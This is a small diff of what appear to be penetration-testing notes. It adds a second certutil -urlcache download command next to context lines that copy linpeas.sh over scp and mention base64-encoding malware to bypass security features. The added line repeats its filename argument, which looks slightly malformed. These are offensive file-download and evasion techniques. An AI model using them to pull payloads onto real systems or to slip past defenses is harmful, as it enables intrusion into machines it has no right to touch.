@@ -60,6 +60,7 @@ scp jack@172.16.6.1:/home/kali/Documents/linpeas.sh .
 - It can even bypass security features by base64 encoding the malware.
 ````
 certutil -urlcache -split -f [url] [filename.extension]
+certutil -urlcache -f [url] [filename.extension] [filename.extension]
 ````
 - `-urlcache` Displays or deletes URL cache entries
 - `-f` Forces fetching a specific URL and updating the cache
